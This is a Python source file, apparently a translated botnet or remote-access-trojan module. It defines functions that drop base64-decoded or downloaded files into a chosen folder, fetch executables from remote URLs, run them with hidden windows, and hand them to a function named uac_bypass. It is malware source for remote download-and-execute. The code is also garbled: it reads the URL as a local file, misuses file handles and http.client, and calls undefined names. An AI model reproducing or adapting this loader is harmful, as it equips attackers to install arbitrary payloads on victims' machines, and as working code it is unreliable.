import base64
import http.client
import os
import subprocess

def file_push(mod, file, name, drop):
    if mod == "0":  # File is a Base 64 String
        with open(deobfuscate(drop) + deobfuscate(name), "wb") as f:
            f.write(base64.std.decode_string(file))
    else:  # Must download the file
        with open(deobfuscate(drop) + deobfuscate(name), "wb") as f:
            response = http.client.HTTPConnection(file)
            response.request("GET", file)
            with open(file, "rb") as f:
                copy = True
                while copy:
                    buffer = f.read(4096)
                    if not buffer:
                        copy = False
                    f.seek(-4096, os.SEEK_END)
                    f.write(buffer)
            f.close()

def download_and_run(mod, file, MD5, uac, parameters):
    if mod == "0":
        if MD5!= "false":
            n = random_string(5, False)
            with open(tmp_path + n + ".exe", "wb") as f:
                f.write(base64.std.decode_string(file))
            if string(compute_md5(tmp_path + n + ".exe")) == MD5:
                if uac == "0":
                    command = tmp_path + n + ".exe " + parameters
                    subprocess.run(command, hide_window=True)
                else:
                    uac_bypass(tmp_path + n + ".exe")
                return
        else:
            n = random_string(5, False)
            with open(tmp_path + n + ".exe", "wb") as f:
                f.write(base64.std.decode_string(file))
            if uac == "0":
                command = tmp_path + n + ".exe " + parameters
                subprocess.run(command, hide_window=True)
            else:
                uac_bypass(tmp_path + n + ".exe")

    else:  # mod == "1"
        if "http://" in file:
            if MD5!= "false":
                n = random_string(5, False)
                with open(tmp_path + n + ".exe", "wb") as f:
                    response = http.client.HTTPConnection(file)
                    response.request("GET", file)
                    with open(file, "rb") as f:
                        copy = True
                        while copy:
                            buffer = f.read(4096)
                            if not buffer:
                                copy = False
                            f.seek(-4096, os.SEEK_END)
                            f.write(buffer)
                    f.close()
                    if string(compute_md5(tmp_path + n + ".exe")) == MD5:
                        if uac == "0":
                            command = tmp_path + n + ".exe " + parameters
                            subprocess.run(command, hide_window=True)
                        else:
                            uac_bypass(tmp_path + n + ".exe")
                        return
                else:
                    NewDebugUpdate("Download and Run File Currupted")

def uac_bypass(file):
    os.startfile(file)

def compute_md5(file):
    with open(file, "rb") as f:
        return hashlib.md5(f.read()).hexdigest()

def random_string(size, is_guid):
    return str(uuid.uuid4()) if is_guid else str(os.urandom(size))
